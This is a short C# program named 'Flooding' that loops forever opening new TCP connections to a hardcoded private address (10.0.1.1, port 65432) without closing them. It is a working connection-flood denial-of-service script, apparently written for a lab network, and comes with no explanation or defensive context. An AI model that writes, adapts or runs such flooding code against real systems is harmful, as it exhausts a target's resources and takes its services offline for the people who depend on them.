
using System.Net.Sockets;

namespace Flooding;

class RunFlooding
{
    const string HOST = "10.0.1.1";
    const int PORT = 65432;

    public static void Main()
    {
        while (true)
        {
            TcpClient tcpClient = new TcpClient();
            tcpClient.Connect(HOST, PORT);
        }
    }
}